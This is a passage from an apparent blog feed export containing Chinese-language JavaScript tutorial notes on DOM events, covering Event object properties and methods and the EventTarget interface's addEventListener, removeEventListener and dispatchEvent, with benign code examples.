<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tag = event.currentTarget.tagName;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Tag: &#x27;</span> + tag); <span class="comment">// 没有任何输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.addEventListener(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> click = <span class="keyword">new</span> Event(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">p.dispatchEvent(click);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p</code>元素发出一个<code>click</code>事件，该事件默认不会冒泡。<code>div.addEventListener</code>方法指定在冒泡阶段监听，因此监听函数不会触发。如果写成<code>div.addEventListener(&#39;click&#39;, callback, true)</code>，那么在“捕获阶段”可以监听到这个事件。</p>
<p>另一方面，如果这个事件在<code>div</code>元素上触发。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.dispatchEvent(click);</span><br></pre></td></tr></table></figure>
<p>那么，不管<code>div</code>元素是在冒泡阶段监听，还是在捕获阶段监听，都会触发监听函数。因为这时<code>div</code>元素是事件的目标，不存在是否冒泡的问题，<code>div</code>元素总是会接收到事件，因此导致监听函数生效。</p>
<h4 id="3-2-实例属性"><a href="#3-2-实例属性" class="headerlink" title="3.2 实例属性"></a>3.2 实例属性</h4><h5 id="3-2-1-Event-bubbles，Event-eventPhase"><a href="#3-2-1-Event-bubbles，Event-eventPhase" class="headerlink" title="3.2.1 Event.bubbles，Event.eventPhase"></a>3.2.1 Event.bubbles，Event.eventPhase</h5><p><code>Event.bubbles</code>属性返回一个布尔值，表示当前事件是否会冒泡。该属性为只读属性，一般用来了解 Event 实例是否可以冒泡。前面说过，除非显式声明，<code>Event</code>构造函数生成的事件，默认是不冒泡的。</p>
<p><code>Event.eventPhase</code>属性返回一个整数常量，表示事件目前所处的阶段。该属性只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> phase = event.eventPhase;</span><br></pre></td></tr></table></figure>
<p><code>Event.eventPhase</code>的返回值有四种可能。</p>
<ul>
<li>0，事件目前没有发生。</li>
<li>1，事件目前处于捕获阶段，即处于从祖先节点向目标节点的传播过程中。</li>
<li>2，事件到达目标节点，即<code>Event.target</code>属性指向的那个节点。</li>
<li>3，事件处于冒泡阶段，即处于从目标节点向祖先节点的反向传播过程中。</li>
</ul>
<h5 id="3-2-2-Event-cancelable，Event-cancelBubble，event-defaultPrevented"><a href="#3-2-2-Event-cancelable，Event-cancelBubble，event-defaultPrevented" class="headerlink" title="3.2.2 Event.cancelable，Event.cancelBubble，event.defaultPrevented"></a>3.2.2 Event.cancelable，Event.cancelBubble，event.defaultPrevented</h5><p><code>Event.cancelable</code>属性返回一个布尔值，表示事件是否可以取消。该属性为只读属性，一般用来了解 Event 实例的特性。</p>
<p>大多数浏览器的原生事件是可以取消的。比如，取消<code>click</code>事件，点击链接将无效。但是除非显式声明，<code>Event</code>构造函数生成的事件，默认是不可以取消的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> evt = <span class="keyword">new</span> Event(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">evt.cancelable  <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>当<code>Event.cancelable</code>属性为<code>true</code>时，调用<code>Event.preventDefault()</code>就可以取消这个事件，阻止浏览器对该事件的默认行为。</p>
<p>如果事件不能取消，调用<code>Event.preventDefault()</code>会没有任何效果。所以使用这个方法之前，最好用<code>Event.cancelable</code>属性判断一下是否可以取消。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">preventEvent</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.cancelable) &#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.warn(<span class="string">&#x27;This event couldn\&#x27;t be canceled.&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.dir(event);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Event.cancelBubble</code>属性是一个布尔值，如果设为<code>true</code>，相当于执行<code>Event.stopPropagation()</code>，可以阻止事件的传播。</p>
<p><code>Event.defaultPrevented</code>属性返回一个布尔值，表示该事件是否调用过<code>Event.preventDefault</code>方法。该属性只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (event.defaultPrevented) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;该事件已经取消了&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-2-3-Event-currentTarget，Event-target"><a href="#3-2-3-Event-currentTarget，Event-target" class="headerlink" title="3.2.3 Event.currentTarget，Event.target"></a>3.2.3 Event.currentTarget，Event.target</h5><p>事件发生以后，会经过捕获和冒泡两个阶段，依次通过多个 DOM 节点。因此，任意事件都有两个与事件相关的节点，一个是事件的原始触发节点（<code>Event.target</code>），另一个是事件当前正在通过的节点（<code>Event.currentTarget</code>）。前者通常是后者的后代节点。</p>
<p><code>Event.currentTarget</code>属性返回事件当前所在的节点，即事件当前正在通过的节点，也就是当前正在执行的监听函数所在的那个节点。随着事件的传播，这个属性的值会变。</p>
<p><code>Event.target</code>属性返回原始触发事件的那个节点，即事件最初发生的节点。这个属性不会随着事件的传播而改变。</p>
<p>事件传播过程中，不同节点的监听函数内部的<code>Event.target</code>与<code>Event.currentTarget</code>属性的值是不一样的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;para&quot;&gt;Hello &lt;em&gt;World&lt;/em&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hide</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 不管点击 Hello 或 World，总是返回 true</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span> === e.currentTarget);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 点击 Hello，返回 true</span></span><br><span class="line">  <span class="comment">// 点击 World，返回 false</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span> === e.target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;para&#x27;</span>).addEventListener(<span class="string">&#x27;click&#x27;</span>, hide, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>&lt;em&gt;</code>是<code>&lt;p&gt;</code>的子节点，点击<code>&lt;em&gt;</code>或者点击<code>&lt;p&gt;</code>，都会导致监听函数执行。这时，<code>e.target</code>总是指向原始点击位置的那个节点，而<code>e.currentTarget</code>指向事件传播过程中正在经过的那个节点。由于监听函数只有事件经过时才会触发，所以<code>e.currentTarget</code>总是等同于监听函数内部的<code>this</code>。</p>
<h5 id="3-2-4-Event-type"><a href="#3-2-4-Event-type" class="headerlink" title="3.2.4 Event.type"></a>3.2.4 Event.type</h5><p><code>Event.type</code>属性返回一个字符串，表示事件类型。事件的类型是在生成事件的时候指定的。该属性只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> evt = <span class="keyword">new</span> Event(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">evt.type <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="3-2-5-Event-timeStamp"><a href="#3-2-5-Event-timeStamp" class="headerlink" title="3.2.5 Event.timeStamp"></a>3.2.5 Event.timeStamp</h5><p><code>Event.timeStamp</code>属性返回一个毫秒时间戳，表示事件发生的时间。它是相对于网页加载成功开始计算的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> evt = <span class="keyword">new</span> Event(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">evt.timeStamp <span class="comment">// 3683.6999999995896</span></span><br></pre></td></tr></table></figure>
<p>它的返回值有可能是整数，也有可能是小数（高精度时间戳），取决于浏览器的设置。</p>
<p>下面是一个计算鼠标移动速度的例子，显示每秒移动的像素数量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> previousX;</span><br><span class="line"><span class="keyword">var</span> previousY;</span><br><span class="line"><span class="keyword">var</span> previousT;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;mousemove&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    previousX !== <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">    previousY !== <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">    previousT !== <span class="literal">undefined</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">var</span> deltaX = event.screenX - previousX;</span><br><span class="line">    <span class="keyword">var</span> deltaY = event.screenY - previousY;</span><br><span class="line">    <span class="keyword">var</span> deltaD = <span class="built_in">Math</span>.sqrt(<span class="built_in">Math</span>.pow(deltaX, <span class="number">2</span>) + <span class="built_in">Math</span>.pow(deltaY, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> deltaT = event.timeStamp - previousT;</span><br><span class="line">    <span class="built_in">console</span>.log(deltaD / deltaT * <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  previousX = event.screenX;</span><br><span class="line">  previousY = event.screenY;</span><br><span class="line">  previousT = event.timeStamp;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="3-2-6-Event-isTrusted"><a href="#3-2-6-Event-isTrusted" class="headerlink" title="3.2.6 Event.isTrusted"></a>3.2.6 Event.isTrusted</h5><p><code>Event.isTrusted</code>属性返回一个布尔值，表示该事件是否由真实的用户行为产生。比如，用户点击链接会产生一个<code>click</code>事件，该事件是用户产生的；<code>Event</code>构造函数生成的事件，则是脚本产生的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> evt = <span class="keyword">new</span> Event(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">evt.isTrusted <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>evt</code>对象是脚本产生的，所以<code>isTrusted</code>属性返回<code>false</code>。</p>
<h5 id="3-2-7-Event-detail"><a href="#3-2-7-Event-detail" class="headerlink" title="3.2.7 Event.detail"></a>3.2.7 Event.detail</h5><p><code>Event.detail</code>属性只有浏览器的 UI （用户界面）事件才具有。该属性返回一个数值，表示事件的某种信息。具体含义与事件类型相关。比如，对于<code>click</code>和<code>dblclick</code>事件，<code>Event.detail</code>是鼠标按下的次数（1表示单击，2表示双击，3表示三击）；对于鼠标滚轮事件，<code>Event.detail</code>是滚轮正向滚动的距离，负值就是负向滚动的距离，返回值总是3的倍数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;p&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">giveDetails</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>).onclick = giveDetails;</span><br></pre></td></tr></table></figure>
<h4 id="3-3-实例方法"><a href="#3-3-实例方法" class="headerlink" title="3.3 实例方法"></a>3.3 实例方法</h4><h5 id="3-3-1-Event-preventDefault"><a href="#3-3-1-Event-preventDefault" class="headerlink" title="3.3.1 Event.preventDefault()"></a>3.3.1 Event.preventDefault()</h5><p><code>Event.preventDefault</code>方法取消浏览器对当前事件的默认行为。比如点击链接后，浏览器默认会跳转到另一个页面，使用这个方法以后，就不会跳转了；再比如，按一下空格键，页面向下滚动一段距离，使用这个方法以后也不会滚动了。该方法生效的前提是，事件对象的<code>cancelable</code>属性为<code>true</code>，如果为<code>false</code>，调用该方法没有任何效果。</p>
<p>注意，该方法只是取消事件对当前元素的默认影响，不会阻止事件的传播。如果要阻止传播，可以使用<code>stopPropagation()</code>或<code>stopImmediatePropagation()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;checkbox&quot; id=&quot;my-checkbox&quot; /&gt;</span></span><br><span class="line"><span class="keyword">var</span> cb = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;my-checkbox&#x27;</span>);</span><br><span class="line"></span><br><span class="line">cb.addEventListener(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">e</span>)</span>&#123; e.preventDefault(); &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面代码中，浏览器的默认行为是单击会选中单选框，取消这个行为，就导致无法选中单选框。</p>
<p>利用这个方法，可以为文本输入框设置校验条件。如果用户的输入不符合条件，就无法将字符输入文本框。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;my-input&quot; /&gt;</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;my-input&#x27;</span>);</span><br><span class="line">input.addEventListener(<span class="string">&#x27;keypress&#x27;</span>, checkName, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkName</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e.charCode &lt; <span class="number">97</span> || e.charCode &gt; <span class="number">122</span>) &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码为文本框的<code>keypress</code>事件设定监听函数后，将只能输入小写字母，否则输入事件的默认行为（写入文本框）将被取消，导致不能向文本框输入内容。</p>
<h5 id="3-3-2-Event-stopPropagation"><a href="#3-3-2-Event-stopPropagation" class="headerlink" title="3.3.2 Event.stopPropagation()"></a>3.3.2 Event.stopPropagation()</h5><p><code>stopPropagation</code>方法阻止事件在 DOM 中继续传播，防止再触发定义在别的节点上的监听函数，但是不包括在当前节点上其他的事件监听函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stopEvent</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  e.stopPropagation();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">el.addEventListener(<span class="string">&#x27;click&#x27;</span>, stopEvent, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>click</code>事件将不会进一步冒泡到el节点的父节点。</p>
<h5 id="3-3-3-Event-stopImmediatePropagation"><a href="#3-3-3-Event-stopImmediatePropagation" class="headerlink" title="3.3.3 Event.stopImmediatePropagation()"></a>3.3.3 Event.stopImmediatePropagation()</h5><p><code>Event.stopImmediatePropagation</code>方法阻止同一个事件的其他监听函数被调用，不管监听函数定义在当前节点还是其他节点。也就是说，该方法阻止事件的传播，比<code>Event.stopPropagation()</code>更彻底。</p>
<p>如果同一个节点对于同一个事件指定了多个监听函数，这些函数会根据添加的顺序依次调用。只要其中有一个监听函数调用了<code>Event.stopImmediatePropagation</code>方法，其他的监听函数就不会再执行了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">l1</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  e.stopImmediatePropagation();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">l2</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">el.addEventListener(<span class="string">&#x27;click&#x27;</span>, l1, <span class="literal">false</span>);</span><br><span class="line">el.addEventListener(<span class="string">&#x27;click&#x27;</span>, l2, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码在<code>el</code>节点上，为<code>click</code>事件添加了两个监听函数<code>l1</code>和<code>l2</code>。由于<code>l1</code>调用了<code>event.stopImmediatePropagation</code>方法，所以<code>l2</code>不会被调用。</p>
<h5 id="3-3-4-Event-composedPath"><a href="#3-3-4-Event-composedPath" class="headerlink" title="3.3.4 Event.composedPath()"></a>3.3.4 Event.composedPath()</h5><p><code>Event.composedPath()</code>返回一个数组，成员是事件的最底层节点和依次冒泡经过的所有上层节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.composedPath());</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// [p, div, body, html, document, Window]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>click</code>事件的最底层节点是<code>p</code>，向上依次是<code>div</code>、<code>body</code>、<code>html</code>、<code>document</code>、<code>Window</code>。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-Event 对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0044</title>
    <url>/2021/05/27/%E6%89%93%E5%8D%A10044/</url>
    <content><![CDATA[<p><font color=#853f04>最孤独的人最亲切，受过伤的人总是笑的最灿烂。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="1-EventTarget-接口"><a href="#1-EventTarget-接口" class="headerlink" title="1. EventTarget 接口"></a>1. EventTarget 接口</h3><p>事件的本质是程序各个组成部分之间的一种通信方式，也是异步编程的一种实现。DOM 支持大量的事件，本章开始介绍 DOM 的事件编程。</p>
<h4 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h4><p>DOM 的事件操作（监听和触发），都定义在<code>EventTarget</code>接口。所有节点对象都部署了这个接口，其他一些需要事件通信的浏览器内置对象（比如，<code>XMLHttpRequest</code>、<code>AudioNode</code>、<code>AudioContext</code>）也部署了这个接口。</p>
<p>该接口主要提供三个实例方法。</p>
<ul>
<li><code>addEventListener</code>：绑定事件的监听函数</li>
<li><code>removeEventListener</code>：移除事件的监听函数</li>
<li><code>dispatchEvent</code>：触发事件</li>
</ul>
<span id="more"></span>
<h4 id="1-2-EventTarget-addEventListener"><a href="#1-2-EventTarget-addEventListener" class="headerlink" title="1.2 EventTarget.addEventListener()"></a>1.2 EventTarget.addEventListener()</h4><p><code>EventTarget.addEventListener()</code>用于在当前节点或对象上，定义一个特定事件的监听函数。一旦这个事件发生，就会执行监听函数。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">target.addEventListener(type, listener[, useCapture]);</span><br></pre></td></tr></table></figure>
<p>该方法接受三个参数。</p>
<ul>
<li><code>type</code>：事件名称，大小写敏感。</li>
<li><code>listener</code>：监听函数。事件发生时，会调用该监听函数。</li>
<li><code>useCapture</code>：布尔值，表示监听函数是否在捕获阶段（capture）触发（参见后文《事件的传播》部分），默认为<code>false</code>（监听函数只在冒泡阶段被触发）。该参数可选。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> button = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line">button.addEventListener(<span class="string">&#x27;click&#x27;</span>, hello, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>button</code>节点的<code>addEventListener</code>方法绑定<code>click</code>事件的监听函数<code>hello</code>，该函数只在冒泡阶段触发。</p>
<p>关于参数，有两个地方需要注意。</p>
<p>首先，第二个参数除了监听函数，还可以是一个具有<code>handleEvent</code>方法的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">buttonElement.addEventListener(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">  handleEvent: <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>addEventListener</code>方法的第二个参数，就是一个具有<code>handleEvent</code>方法的对象。</p>
<p>其次，第三个参数除了布尔值<code>useCapture</code>，还可以是一个属性配置对象。该对象有以下属性。</p>
<ul>
<li><code>capture</code>：布尔值，表示该事件是否在捕获阶段触发监听函数。</li>
<li><code>once</code>：布尔值，表示监听函数是否只触发一次，然后就自动移除。</li>
<li><code>passive</code>：布尔值，表示监听函数不会调用事件的<code>preventDefault</code>方法。如果监听函数调用了，浏览器将忽略这个要求，并在监控台输出一行警告。</li>
</ul>
<p>如果希望事件监听函数只执行一次，可以打开属性配置对象的<code>once</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 只执行一次的代码</span></span><br><span class="line">&#125;, &#123;<span class="attr">once</span>: <span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure>
<p><code>addEventListener</code>方法可以为针对当前对象的同一个事件，添加多个不同的监听函数。这些函数按照添加顺序触发，即先添加先触发。如果为同一个事件多次添加同一个监听函数，该函数只会执行一次，多余的添加将自动被去除（不必使用<code>removeEventListener</code>方法手动去除）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;click&#x27;</span>, hello, <span class="literal">false</span>);</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;click&#x27;</span>, hello, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>执行上面代码，点击文档只会输出一行<code>Hello world</code>。</p>
<p>如果希望向监听函数传递参数，可以用匿名函数包装一下监听函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line">el.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; print(<span class="string">&#x27;Hello&#x27;</span>); &#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码通过匿名函数，向监听函数<code>print</code>传递了一个参数。</p>
<p>监听函数内部的<code>this</code>，指向当前事件所在的那个对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;para&quot;&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> para = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;para&#x27;</span>);</span><br><span class="line">para.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.nodeName); <span class="comment">// &quot;P&quot;</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，监听函数内部的<code>this</code>指向事件所在的对象<code>para</code>。</p>
<h4 id="1-3-EventTarget-removeEventListener"><a href="#1-3-EventTarget-removeEventListener" class="headerlink" title="1.3 EventTarget.removeEventListener()"></a>1.3 EventTarget.removeEventListener()</h4><p><code>EventTarget.removeEventListener</code>方法用来移除<code>addEventListener</code>方法添加的事件监听函数。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line">div.removeEventListener(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p><code>removeEventListener</code>方法的参数，与<code>addEventListener</code>方法完全一致。它的第一个参数“事件类型”，大小写敏感。</p>
<p>注意，<code>removeEventListener</code>方法移除的监听函数，必须是<code>addEventListener</code>方法添加的那个监听函数，而且必须在同一个元素节点，否则无效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;&#125;, <span class="literal">false</span>);</span><br><span class="line">div.removeEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>removeEventListener</code>方法无效，因为监听函数不是同一个匿名函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.addEventListener(<span class="string">&#x27;mousedown&#x27;</span>, handleMouseDown, <span class="literal">true</span>);</span><br><span class="line">element.removeEventListener(<span class="string">&quot;mousedown&quot;</span>, handleMouseDown, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>removeEventListener</code>方法也是无效的，因为第三个参数不一样。</p>
<h4 id="1-4-EventTarget-dispatchEvent"><a href="#1-4-EventTarget-dispatchEvent" class="headerlink" title="1.4 EventTarget.dispatchEvent()"></a>1.4 EventTarget.dispatchEvent()</h4><p><code>EventTarget.dispatchEvent</code>方法在当前节点上触发指定事件，从而触发监听函数的执行。该方法返回一个布尔值，只要有一个监听函数调用了<code>Event.preventDefault()</code>，则返回值为<code>false</code>，否则为<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">target.dispatchEvent(event)</span><br></pre></td></tr></table></figure>
<p><code>dispatchEvent</code>方法的参数是一个<code>Event</code>对象的实例（详见《Event 对象》章节）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">para.addEventListener(<span class="string">&#x27;click&#x27;</span>, hello, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> Event(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">para.dispatchEvent(event);</span><br></pre></td></tr></table></figure>
<p>上面代码在当前节点触发了<code>click</code>事件。</p>
<p>如果<code>dispatchEvent</code>方法的参数为空，或者不是一个有效的事件对象，将报错。</p>
<p>下面代码根据<code>dispatchEvent</code>方法的返回值，判断事件是否被取消了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> canceled = !cb.dispatchEvent(event);</span><br><span class="line"><span class="keyword">if</span> (canceled) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;事件取消&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;事件未取消&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-EventTarget 接口</tag>
      </tags>
  </entry>
  <entry>
